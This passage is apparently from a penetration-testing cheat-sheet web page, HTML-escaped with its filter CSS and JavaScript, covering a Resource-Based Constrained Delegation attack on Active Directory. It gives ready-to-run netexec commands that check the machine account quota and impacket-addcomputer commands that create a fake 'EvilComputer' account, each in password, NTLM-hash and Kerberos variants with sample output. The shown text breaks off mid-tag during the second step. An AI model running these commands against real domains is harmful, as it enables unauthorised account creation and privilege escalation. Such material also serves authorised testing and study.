.cell:hover:not(.has-subrow) {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);  &#xA;}&#xA;.auth-grid .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;.sub-row {&#xA;  display: flex;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  gap: 1px;&#xA;  box-sizing: border-box;&#xA;}&#xA;.sub-item {&#xA;  flex: 1;&#xA;  background: var(--bg);&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  color: var(--fg);&#xA;  transition: background .12s ease, color .12s ease;&#xA;}&#xA;.sub-item .btn { width: 100%; height: 100%; }&#xA;&#xA;.sub-item:hover {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;.sub-item:has(.btn.active) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;body.dark-mode .auth-frame {&#xA;  border-color: var(--dm-line);&#xA;  background: var(--dm-line);&#xA;}&#xA;body.dark-mode .cell,&#xA;body.dark-mode .sub-item {&#xA;  background: var(--dm-bg);&#xA;  color: var(--dm-fg);&#xA;}&#xA;body.dark-mode .title {&#xA;  background: var(--dm-bg);&#xA;  color: #d5d5d5;&#xA;}&#xA;&#xA;body.dark-mode .cell:hover:not(.has-subrow) {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);  &#xA;}&#xA;body.dark-mode .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;body.dark-mode .sub-item:hover {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);&#xA;}&#xA;body.dark-mode .sub-item:has(.btn.active) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;&#xA; &#xA;.highlight.active-block pre {&#xA;  border: 1px solid var(--grey-lighten-3);&#xA;  border-radius: 0.2rem;&#xA;}&#xA;&#xA;.highlight.active-block.codeBlock pre:hover,&#xA;.highlight.active-block.codeBlock-start pre:hover,&#xA;.highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--secondary);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block pre {&#xA;  border-color: var(--grey-darken-4);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block.codeBlock pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-start pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--grey-lighten-1);&#xA;}&#xA;&#xA; &#xA;@media (max-width: 768px) {&#xA;  .auth-grid {&#xA;    grid-template-columns: 1fr;&#xA;    grid-template-rows: auto repeat(5, auto);&#xA;  }&#xA;  .cell-all,&#xA;  .cell-pw,&#xA;  .cell-ntlm,&#xA;  .cell-ker,&#xA;  .cell-subs {&#xA;    grid-row: auto;&#xA;    grid-column: 1;&#xA;  }&#xA;  .sub-row { flex-direction: column; }&#xA;}&#xA;&lt;/style&gt;&#xA;&#xA;&lt;script&gt;&#xA;document.addEventListener(&#34;DOMContentLoaded&#34;, () =&gt; {&#xA;  const buttons = document.querySelectorAll(&#34;.auth-grid .btn&#34;);&#xA;  const filters = [&#34;password&#34;, &#34;ntlm&#34;, &#34;password-based-kerberos&#34;, &#34;ntlm-based-kerberos&#34;, &#34;ticket-based-kerberos&#34;];&#xA;&#xA;  const filterMap = {&#xA;    password: [&#34;password&#34;],&#xA;    ntlm: [&#34;ntlm&#34;],&#xA;    &#34;kerberos-password&#34;: [&#34;password-based-kerberos&#34;],&#xA;    &#34;kerberos-ntlm&#34;: [&#34;ntlm-based-kerberos&#34;],&#xA;    &#34;kerberos-ticket&#34;: [&#34;ticket-based-kerberos&#34;],&#xA;    all: filters,&#xA;  };&#xA;&#xA;  function filterBlocks(filter) {&#xA;    const targetClasses = filterMap[filter] || [];&#xA;    const authClasses = [&#xA;      &#34;password&#34;,&#xA;      &#34;ntlm&#34;,&#xA;      &#34;password-based-kerberos&#34;,&#xA;      &#34;ntlm-based-kerberos&#34;,&#xA;      &#34;ticket-based-kerberos&#34;,&#xA;    ];&#xA;    const blocks = [...document.querySelectorAll(&#34;.highlight&#34;)];&#xA;    const groups = [];&#xA;    let current = [];&#xA;&#xA;    &#xA;    blocks.forEach(block =&gt; {&#xA;      current.push(block);&#xA;      const isEnd = block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      const isStandalone = block.classList.contains(&#34;codeBlock-start&#34;) &amp;&amp; block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      if (isEnd || isStandalone) {&#xA;        groups.push(current);&#xA;        current = [];&#xA;      }&#xA;    });&#xA;    if (current.length) groups.push(current);&#xA;&#xA;    &#xA;    groups.forEach(group =&gt; {&#xA;      const authBlocks = group.filter(b =&gt; authClasses.some(c =&gt; b.classList.contains(c)));&#xA;      if (!authBlocks.length) return; &#xA;&#xA;      &#xA;      if (filter === &#34;all&#34;) {&#xA;        authBlocks.forEach(b =&gt; {&#xA;          b.style.display = &#34;block&#34;;&#xA;          b.classList.remove(&#34;active-block&#34;);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      const matched = authBlocks.filter(b =&gt;&#xA;        targetClasses.some(tc =&gt; b.classList.contains(tc))&#xA;      );&#xA;&#xA;      if (matched.length &gt; 0) {&#xA;        &#xA;        authBlocks.forEach(b =&gt; {&#xA;          const visible = matched.includes(b);&#xA;          b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;          b.classList.toggle(&#34;active-block&#34;, visible);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      let fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;password&#34;));&#xA;      if (fallback.length === 0) {&#xA;        fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;ntlm&#34;));&#xA;      }&#xA;&#xA;      &#xA;      authBlocks.forEach(b =&gt; {&#xA;        const visible = fallback.includes(b);&#xA;        b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;        b.classList.toggle(&#34;active-block&#34;, visible);&#xA;      });&#xA;    });&#xA;  }&#xA;&#xA;  function setActiveButton(btn) {&#xA;    buttons.forEach(b =&gt; b.classList.remove(&#34;active&#34;));&#xA;    btn.classList.add(&#34;active&#34;);&#xA;    const filter = btn.dataset.filter;&#xA;    localStorage.setItem(&#34;authFilter&#34;, filter);&#xA;    filterBlocks(filter);&#xA;  }&#xA;&#xA;  const saved = localStorage.getItem(&#34;authFilter&#34;);&#xA;  const initial = saved &amp;&amp; filterMap[saved] ? saved : &#34;all&#34;;&#xA;  const initBtn = [...buttons].find(b =&gt; b.dataset.filter === initial);&#xA;  initBtn ? setActiveButton(initBtn) : filterBlocks(&#34;all&#34;);&#xA;&#xA;  buttons.forEach(btn =&gt; btn.addEventListener(&#34;click&#34;, () =&gt; setActiveButton(btn)));&#xA;});&#xA;&lt;/script&gt;&#xA;&#xA;&lt;br&gt;&#xA;&#xA;&#xA;&lt;div class=&#34;auth-wrapper&#34;&gt;&#xA;  &lt;div class=&#34;auth-frame&#34;&gt;&#xA;    &lt;div class=&#34;auth-grid&#34;&gt;&#xA;      &lt;div class=&#34;cell title&#34;&gt;Authentication Method&lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-all&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;all&#34;&gt;ALL&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-pw&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;password&#34;&gt;PASSWORD&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ntlm&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;ntlm&#34;&gt;NTLM&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ker&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;kerberos&#34;&gt;KERBEROS&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-subs has-subrow&#34;&gt;&#xA;        &lt;div class=&#34;sub-row&#34;&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-password&#34;&gt;PASSWORD&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-ntlm&#34;&gt;NTLM&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn active&#34; data-filter=&#34;kerberos-ticket&#34;&gt;TICKET&lt;/button&gt;&lt;/div&gt;&#xA;        &lt;/div&gt;&#xA;      &lt;/div&gt;&#xA;    &lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;rbcd-attack&#34;&gt;RBCD Attack&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34; &gt;Linux&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab2&#34; &gt;Windows&lt;/button&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34;&gt;&lt;h4 id=&#34;1-check-machine-quota-optional&#34;&gt;1. Check Machine Quota [Optional]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap DC01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -d example.com -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123! &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -d giveback.htb -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --kdcHost &amp;lt;DC&amp;gt; -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -d giveback.htb -k --kdcHost dc01.example.com -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123! &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --kdcHost &amp;lt;DC&amp;gt; -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -d giveback.htb -k --kdcHost dc01.example.com -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --use-kcache --kdcHost &amp;lt;DC&amp;gt; -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -d giveback.htb -k --use-kcache --kdcHost dc01.example.com -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-create-a-fake-computer-optional&#34;&gt;2. Create a Fake Computer [Optional]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-addcomputer &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -computer-name &amp;#39;&amp;lt;COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-addcomputer &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed:Password123!&amp;#39;&lt;/span&gt; -computer-name &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer&amp;#39;&lt;/span&gt; -computer-pass &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Successfully added machine account EvilComputer$ with password Password123!.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-addcomputer &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; -computer-name &amp;#39;&amp;lt;COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-addcomputer &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -computer-name &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer&amp;#39;&lt;/span&gt; -computer-pass &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Successfully added machine account EvilComputer$ with password Password123!.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-addcomputer &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -computer-name &amp;#39;&amp;lt;COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight 